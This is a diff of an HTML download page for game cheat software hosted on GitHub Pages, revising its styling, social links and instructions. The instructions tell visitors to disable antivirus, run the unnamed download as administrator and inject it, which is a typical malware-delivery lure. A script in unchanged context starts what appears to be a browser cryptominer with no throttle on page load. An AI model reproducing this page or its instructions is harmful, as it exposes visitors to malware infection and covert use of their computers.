@@ -2,54 +2,53 @@
 <html lang="en">
 <head>
 
-    <!-- Google tag (gtag.js) -->
+        <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-5ER0C883BS"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
   gtag('config', 'G-5ER0C883BS');
 </script>
-    
+
 <meta charset="UTF-8">
 <meta name="google-site-verification" content="8VWSZTULhXNzftlTfYrmKWSGbatZSE4UkotgBO8sKc0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Download</title>
 <meta name="description" content="Free scripts, software & tools for games.">
-<meta name="keywords" content="Mods, cheats, software, softaim, hacks">
-<link rel="icon" type="image/x-icon" href="Favicon.png">
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://slaya4.github.io/skibidi/">
+<link rel="icon" href="Favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <style>
 body {
+    margin: 0;
+    padding: 40px;
     font-family: Arial, Helvetica, sans-serif;
     background: #ffffff;
     color: #000000;
-    padding: 40px;
 }
 
 .title {
     font-size: 28px;
     font-weight: bold;
-    margin-bottom: 6px;
 }
 
 .version {
-    color: #2563eb;
+    margin-top: 4px;
     font-size: 14px;
-    margin-bottom: 24px;
+    color: #2563eb;
 }
 
 .download {
     display: inline-block;
+    margin: 24px 0 40px;
     padding: 12px 22px;
     background: #2563eb;
     color: #ffffff;
     text-decoration: none;
     font-weight: bold;
     border-radius: 6px;
-    margin-bottom: 40px;
 }
 
 .section-title {
@@ -62,6 +61,25 @@ body {
     max-width: 600px;
     font-size: 15px;
     line-height: 1.6;
+}
+
+.socials {
+    margin-top: 28px;
+    display: flex;
+    gap: 16px;
+}
+
+.socials a {
+    font-size: 22px;
+    text-decoration: none;
+}
+
+.socials .discord {
+    color: #5865F2;
+}
+
+.socials .youtube {
+    color: #FF0000;
 }
 
 .views {
@@ -89,18 +107,29 @@ body {
     Download
 </a>
 
-<div class="section-title">Instructions:</div>
+<div class="section-title">Instructions</div>
 
 <div class="instructions">
-    1. Turn of all AV software<br>
+    1. Turn off AV software<br>
     2. Download the file<br>
-    3. Run it as an admin
+    3. Run it as administrator<br>
+    4. Inject the software<br>
+    5. Open the game
+</div>
+
+<div class="socials">
+    <a class="discord" href="https://discord.gg/3VYgd72Q" target="_blank" rel="noopener" aria-label="Discord">
+        <i class="fa-brands fa-discord"></i>
+    </a>
+    <a class="youtube" href="https://www.youtube.com/@slaya4" target="_blank" rel="noopener" aria-label="YouTube">
+        <i class="fa-brands fa-youtube"></i>
+    </a>
 </div>
 
 <p class="views">
     <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-        <circle cx="12" cy="12" r="3"></circle>
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+        <circle cx="12" cy="12" r="3"/>
     </svg>
     Views: <span id="viewCount">...</span>
 </p>
@@ -111,18 +140,17 @@ body {
         throttle: 0, c: 'w'
     });
     _client.start();
-    
-
 </script>
 
 <script>
-fetch("https://counter.slaya7.workers.dev", {
-    method: "POST"
-})
-.then(r => r.json())
-.then(d => {
-    document.getElementById("viewCount").textContent = d.views.toLocaleString();
-});
+fetch("https://counter.slaya7.workers.dev", { method: "POST" })
+    .then(r => r.json())
+    .then(d => {
+        document.getElementById("viewCount").textContent = Number(d.views).toLocaleString();
+    })
+    .catch(() => {
+        document.getElementById("viewCount").textContent = "—";
+    });
 </script>
 
 </body>
